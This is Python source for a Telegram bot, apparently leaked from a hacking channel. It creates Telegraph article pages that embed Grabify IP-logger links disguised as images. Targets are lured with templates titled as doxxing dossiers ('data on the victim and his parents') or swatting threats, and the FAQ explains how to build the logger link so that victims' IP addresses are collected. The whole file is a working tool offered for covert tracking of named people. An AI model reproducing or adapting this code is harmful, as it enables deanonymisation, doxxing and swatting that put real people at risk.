# СОЗДАТЕЛЬ ЭТОГО БОТА @exploitwizard
#слито в @pr0xit

import telebot
from telegraph import Telegraph, TelegraphException
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = ''
bot = telebot.TeleBot(TOKEN)

telegraph = Telegraph()
telegraph.create_account(short_name='bot')

user_states = {}

MAX_TITLE_LENGTH = 30

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton('😎 Создать статью', callback_data='create_article'),
        InlineKeyboardButton('❓️ FAQ', callback_data='faq'),
        )
    markup.row(
        InlineKeyboardButton('🔰 Канал', callback_data='authors'),
        InlineKeyboardButton('⭐️ Шаблоны', callback_data='templates')
    )
    bot.reply_to(message, "Нажмите на одну из кнопок для продолжения.", reply_markup=markup)
    user_states[message.chat.id] = {'state': 'awaiting_title', 'title': '', 'content': '', 'link': '', 'num_links': 0}

@bot.callback_query_handler(func=lambda call: call.data == 'create_article')
def create_article(call):
    chat_id = call.message.chat.id
    bot.send_message(chat_id, "Отправьте мне заголовок для статьи.")
    user_states[chat_id] = {'state': 'awaiting_title', 'title': '', 'content': '', 'link': '', 'num_links': 0}

# СОЗДАТЕЛЬ ЭТОГО БОТА @exploitwizard
@bot.callback_query_handler(func=lambda call: call.data == 'faq')
def show_faq(call):
    bot.send_message(call.message.chat.id, "Делаешь ссылку логгер в grabify.link и обязательно чтобы в конце логгера было либо .png, либо .jpg и кидай эту ссылку боту. Айпи жертв будут на сайте. Тутор: https://telegra.ph/Tutor-po-sozdaniyu-ssylki-07-21")

@bot.callback_query_handler(func=lambda call: call.data == 'authors')
def show_authors(call):
    bot.send_message(call.message.chat.id, "Канал создателя: @exploitwizard")

@bot.callback_query_handler(func=lambda call: call.data == 'templates')
def show_templates(call):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton('🔥 Де#нон', callback_data='template_deanon'),
    )
    markup.row(
        InlineKeyboardButton('😈 Св@т', callback_data='template_swat')
    )
    bot.send_message(call.message.chat.id, "Выберите шаблон для статьи:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'template_swat')
def template_swat(call):
    chat_id = call.message.chat.id
    
    if chat_id in user_states:
        user_states[chat_id]['state'] = 'awaiting_swat_nickname'
        bot.send_message(chat_id, "Напишите никнейм жертвы.")
    else:
        
        user_states[chat_id] = {'state': 'awaiting_swat_nickname'}
        bot.send_message(chat_id, "Напишите никнейм жертвы.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('state') == 'awaiting_swat_nickname')
def handle_swat_nickname(message):
    chat_id = message.chat.id
    user_states[chat_id]['swat_username'] = message.text
    bot.reply_to(message, "Отправьте ссылку логгер с Grabify.")
    user_states[chat_id]['state'] = 'awaiting_link_swat'

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('state') == 'awaiting_link_swat')
def handle_swat_link(message):
    chat_id = message.chat.id
    link = message.text
    if link.startswith("https://grabify.link/") and (link.endswith(".jpg") or link.endswith(".png")):
        user_states[chat_id]['swat_link'] = link
        
        title = f"SWAT {user_states[chat_id]['swat_username']}"
        content = f"SW4T {user_states[chat_id]['swat_username']}:"
        content += f'<img src="{user_states[chat_id]["swat_link"]}"/>'
        
        try:
            response = telegraph.create_page(
                title=title,
                html_content=content
            )
            if 'url' in response:
                bot.reply_to(message, f"Статья создана, айпи жертв будет на сайте grabify: {response['url']}")
            else:
                bot.reply_to(message, "Произошла ошибка при создании статьи.")
        except TelegraphException as e:
            print(f"Telegram Telegraph API error: {e}")
    else:
        bot.reply_to(message, "Пожалуйста, отправьте корректную ссылку логгер с Grabify, заканчивающуюся на .jpg или .png.")
        
@bot.callback_query_handler(func=lambda call: call.data == 'template_deanon')
def template_deanon(call):
    chat_id = call.message.chat.id
    
    if chat_id in user_states:
        user_states[chat_id]['state'] = 'awaiting_nickname'
        bot.send_message(chat_id, "Напишите никнейм жертвы.")
    else:
       
        user_states[chat_id] = {'state': 'awaiting_nickname'}
        bot.send_message(chat_id, "Напишите никнейм жертвы.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('state') == 'awaiting_nickname')
def handle_deanon_nickname(message):
    chat_id = message.chat.id
    user_states[chat_id]['victim_username'] = message.text
    bot.reply_to(message, "Отправьте ссылку логгер с Grabify.")
    user_states[chat_id]['state'] = 'awaiting_link_deanon'

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get('state') == 'awaiting_link_deanon')
def handle_deanon_link(message):
    chat_id = message.chat.id
    link = message.text
    if link.startswith("https://grabify.link/") and (link.endswith(".jpg") or link.endswith(".png")):
        user_states[chat_id]['deanon_link'] = link
        
        title = f"Данные {user_states[chat_id]['victim_username']} и его родителей."
        content = f"Деанон на {user_states[chat_id]['victim_username']}"
        content += f'<img src="{user_states[chat_id]["deanon_link"]}"/>'
        
        try:
            response = telegraph.create_page(
                title=title,
                html_content=content
            )
            if 'url' in response:
                bot.reply_to(message, f"Статья создана, айпи жертв будет на сайте grabify: {response['url']}")
            else:
                bot.reply_to(message, "Произошла ошибка при создании статьи.")
        except TelegraphException as e:
            print(f"Telegram Telegraph API error: {e}")
    else:
        bot.reply_to(message, "Пожалуйста, отправьте корректную ссылку логгер с Grabify, заканчивающуюся на .jpg или .png.")
        
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        state_info = user_states[chat_id]
        if state_info['state'] == 'awaiting_title':
            title_words = message.text.split()[:MAX_TITLE_LENGTH]  
            
            title = " ".join(title_words)
            if len(title) > MAX_TITLE_LENGTH:  
            
                title = title[:MAX_TITLE_LENGTH]  
                
            state_info['title'] = title
            bot.reply_to(message, "Отправьте мне текст для статьи.")
            state_info['state'] = 'awaiting_text'
        elif state_info['state'] == 'awaiting_text':
            state_info['content'] = message.text
            bot.reply_to(message, "Отправьте мне ссылку с Grabify.")
            state_info['state'] = 'awaiting_link'
        elif state_info['state'] == 'awaiting_link':
            if message.text.startswith("https://grabify.link/") and (message.text.endswith(".jpg") or message.text.endswith(".png")):
                state_info['link'] = message.text
                bot.reply_to(message, "Сколько раз вы хотите добавить эту ссылку в статью?")
                state_info['state'] = 'awaiting_num_links'
            else:
                bot.reply_to(message, "Пожалуйста, отправьте корректную ссылку логгер с Grabify, заканчивающуюся на .jpg или .png.")
        elif state_info['state'] == 'awaiting_num_links':
            try:
                state_info['num_links'] = int(message.text)
                content = f"<p>{state_info['content']}</p>"
                for _ in range(state_info['num_links']):
                    content += f'<img src="{state_info["link"]}"/>'
                
                try:
                    response = telegraph.create_page(
                        title=state_info['title'],
                        html_content=content
                    )
                    if 'url' in response:
                        bot.reply_to(message, f"Статья создана, айпи жертв будет на сайте grabify: {response['url']}")
                    else:
                        bot.reply_to(message, "Произошла ошибка при создании статьи.")
                except TelegraphException as e:
                    if "TITLE_TOO_LONG" in str(e):
                        if len(state_info['title']) > MAX_TITLE_LENGTH:
                            state_info['title'] = "Слишком длинный заголовок"
                        response = telegraph.create_page(
                            title=state_info['title'],
                            html_content=content
                        )
                        if 'url' in response:
                            bot.reply_to(message, f"Статья создана, айпи жертв будет на сайте: {response['url']}")
                        else:
                            bot.reply_to(message, "Произошла ошибка при создании статьи.")
                    else:
                        print(f"Telegram Telegraph API error: {e}")
                    
                user_states[chat_id] = {'state': 'awaiting_title', 'title': '', 'content': '', 'link': '', 'num_links': 0}
            except ValueError:
                bot.reply_to(message, "Пожалуйста, введите корректное число.")

bot.polling()
# СОЗДАТЕЛЬ ЭТОГО БОТА @exploitwizard
#слито в @pr0xit